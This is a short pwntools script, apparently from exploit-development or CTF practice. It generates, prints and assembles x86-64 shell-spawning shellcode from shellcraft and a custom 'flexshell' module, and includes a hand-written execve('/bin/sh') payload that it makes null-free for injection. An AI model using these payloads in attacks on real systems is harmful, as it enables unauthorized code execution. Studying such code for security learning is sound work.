#!/usr/bin/env python3
from pwn import *
import flexshell

context(arch='amd64', os = 'linux')

print("*****************SHELLCRAFT CODE******************")
print(shellcraft.sh())
print("***************END SHELLCRAFT CODE****************")
print("\n")
print("*****************FLEXSHELL CODE No Bin/Sh*******************")
print(flexshell.nobinsh())
print("***************END FLEXSHELL CODE*****************")
print("\n")
print("*****************SHELLCRAFT ASSEMBLY******************")
print("\n")
print(asm(shellcraft.sh()))
print("\n")
print("***************END SHELLCRAFT ASSEMBLY****************")
print("\n")
print("*****************FLEXSHELL CODE Shorten******************")
print("\n")
print(flexshell.compact())
print("\n")
print("***************END FLEXSHELL CODE****************")
print("*****************FLEXSHELL CODE combined******************")
print("\n")
print(flexshell.combined(flexshell.compact()))
print("\n")
print("***************END FLEXSHELL CODE****************")
print("\n")
print("*****************FLEXSHELL ASSEMBLY*******************")
print("\n")
print(asm(flexshell.nobinsh()))
print("\n")
print("***************END FLEXSHELL ASSEMBLY*****************")


shellcode = '''
    mov rax, 0x3b
    push 0x0
    mov rdx, rsp
    mov rsi, rsp
    mov r10, 0x68732f6e69622f
    push r10
    mov rdi, rsp
    syscall
    mov rax, 0x3c
    mov rdi, 0x0
    syscall'''

nonull_shellcode = flexshell.nonull(shellcode)
print(nonull_shellcode)
print(asm(nonull_shellcode))
